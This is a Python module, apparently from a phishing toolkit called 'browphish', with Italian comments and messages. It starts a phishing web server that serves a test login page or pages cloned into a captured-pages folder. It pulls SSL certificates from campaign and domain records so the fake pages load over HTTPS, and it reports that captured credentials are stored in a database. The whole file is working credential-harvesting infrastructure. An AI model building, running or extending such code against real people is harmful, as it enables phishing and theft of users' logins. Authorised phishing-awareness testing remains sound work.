# browphish/src/modules/web_pages/server_manager.py

import logging
import time
from pathlib import Path
from colorama import Fore, Style
from cli.utils import prompt_for_input
from modules.web_pages.web_server import start_web_server

logger = logging.getLogger("browphish.modules.server_manager")

def start_phishing_server() -> None:
    """Gestisce l'avvio del server di phishing con scelta pagina."""
    print(f"\n{Fore.LIGHTRED_EX}--- AVVIO SERVER PHISHING ---{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}1.{Style.RESET_ALL} Mostra pagina di test (simple_login.html)")
    print(f"{Fore.LIGHTRED_EX}2.{Style.RESET_ALL} Mostra pagina clonata da data/captured_pages/")
    print(f"{Fore.RED}0.{Style.RESET_ALL} Annulla")
    choice = prompt_for_input("Scegli quale pagina servire: ")

    if choice == "1":
        page_name = "simple_login"
        page_path = "templates/web_pages/simple_login.html"
        start_server_with_page(page_name, "test")
    elif choice == "2":
        select_captured_page()
    elif choice == "0":
        print(f"{Fore.YELLOW}Operazione annullata.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Scelta non valida.{Style.RESET_ALL}")

def select_captured_page() -> None:
    """Seleziona una pagina clonata da servire."""
    # Elenca le pagine disponibili
    captured_dir = Path("data/captured_pages")
    pages = [p.stem for p in captured_dir.glob("*.html")]
    
    if not pages:
        print(f"{Fore.YELLOW}Nessuna pagina clonata trovata in data/captured_pages/{Style.RESET_ALL}")
        return
    
    print(f"{Fore.LIGHTRED_EX}Pagine disponibili:{Style.RESET_ALL}")
    for i, page in enumerate(pages, 1):
        print(f"  {i}. {page}")
    
    page_choice = prompt_for_input("Scegli pagina (numero): ")
    
    try:
        page_index = int(page_choice) - 1
        if 0 <= page_index < len(pages):
            page_name = pages[page_index]
            page_path = f"data/captured_pages/{page_name}.html"
            start_server_with_page(page_name, "captured")
        else:
            print(f"{Fore.RED}Scelta non valida.{Style.RESET_ALL}")
    except ValueError:
        print(f"{Fore.RED}Input non valido.{Style.RESET_ALL}")

def start_server_with_page(page_name: str, page_type: str, cert_path: str | None = None, key_path: str | None = None) -> None:
    """Avvia il server con la pagina specificata, supportando HTTPS se i certificati sono presenti.

    I percorsi dei certificati possono essere forniti come argomenti (override), oppure verranno
    ricavati dal database: prima si controlla la configurazione della campagna, poi del dominio.
    Per la pagina di test si verificheranno anche le variabili d'ambiente BROWPHISH_SSL_CERT / BROWPHISH_SSL_KEY.
    """
    try:
        ssl_context = None

        # Se i percorsi sono passati esplicitamente, usali
        if cert_path and key_path:
            if Path(cert_path).exists() and Path(key_path).exists():
                ssl_context = (cert_path, key_path)
                print(f"{Fore.LIGHTGREEN_EX}✓ Certificati forniti. Il server userà HTTPS.{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}Certificati forniti ma non trovati o non accessibili. Il server userà HTTP.{Style.RESET_ALL}")
        else:
            # Prova a ricavare i percorsi dal database per le pagine clonate
            from db.manager import DatabaseManager
            db_manager = DatabaseManager.get_instance()

            if page_type == 'captured':
                # Centralizza la logica di lookup in campaign_manager
                try:
                    from modules.campaign_managers import campaign_manager as cm
                    certs = cm.get_ssl_paths_for_page(page_name, db_manager)
                    if certs and certs != (None, None):
                        ssl_context = certs
                        print(f"{Fore.LIGHTGREEN_EX}✓ Certificati trovati nella configurazione (campagna/dom). Il server userà HTTPS.{Style.RESET_ALL}")
                except Exception:
                    # Se qualcosa va storto, fallback alla logica precedente (silenziosamente)
                    page_row = db_manager.fetch_one("SELECT campaign_entity_id, domain_entity_id FROM phishing_pages WHERE name = ?", (page_name,))
                    if page_row:
                        camp_id = page_row.get('campaign_entity_id')
                        dom_id = page_row.get('domain_entity_id')

                        if camp_id:
                            camp = db_manager.fetch_one("SELECT ssl_cert_path, ssl_key_path FROM phishing_campaigns WHERE id = ?", (camp_id,))
                            if camp and camp.get('ssl_cert_path') and camp.get('ssl_key_path'):
                                cp, kp = camp['ssl_cert_path'], camp['ssl_key_path']
                                if Path(cp).exists() and Path(kp).exists():
                                    ssl_context = (cp, kp)
                                    print(f"{Fore.LIGHTGREEN_EX}✓ Certificati trovati nella configurazione della campagna. Il server userà HTTPS.{Style.RESET_ALL}")
                        if ssl_context is None and dom_id:
                            dom = db_manager.fetch_one("SELECT ssl_cert_path, ssl_key_path FROM entities WHERE id = ?", (dom_id,))
                            if dom and dom.get('ssl_cert_path') and dom.get('ssl_key_path'):
                                cp, kp = dom['ssl_cert_path'], dom['ssl_key_path']
                                if Path(cp).exists() and Path(kp).exists():
                                    ssl_context = (cp, kp)
                                    print(f"{Fore.LIGHTGREEN_EX}✓ Certificati trovati nella configurazione del dominio. Il server userà HTTPS.{Style.RESET_ALL}")

            # Per la pagina di test, prova le variabili d'ambiente come fallback
            if ssl_context is None and page_type == 'test':
                import os
                env_cert = os.environ.get('BROWPHISH_SSL_CERT')
                env_key = os.environ.get('BROWPHISH_SSL_KEY')
                if env_cert and env_key and Path(env_cert).exists() and Path(env_key).exists():
                    ssl_context = (env_cert, env_key)
                    print(f"{Fore.LIGHTGREEN_EX}✓ Certificati trovati dalle variabili d'ambiente. Il server userà HTTPS.{Style.RESET_ALL}")

            if ssl_context is None:
                print(f"{Fore.YELLOW}Nessun certificato valido trovato. Il server userà HTTP.{Style.RESET_ALL}")

        # Avvia il server passando ssl_context (o None)
        start_web_server(page_name=page_name, page_type=page_type, ssl_context=ssl_context)
        print(f"{Fore.LIGHTRED_EX}✓ Server phishing avviato su {page_name} (porta 5000).{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Assicurati che un firewall non lo blocchi e che la porta sia libera.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Il server salverà le credenziali catturate nel database.{Style.RESET_ALL}")
        time.sleep(2)
    except Exception as e:
        logger.error(f"Errore nell'avvio del server: {e}", exc_info=True)
        print(f"{Fore.RED}✗ Errore nell'avvio del server: {e}{Style.RESET_ALL}") 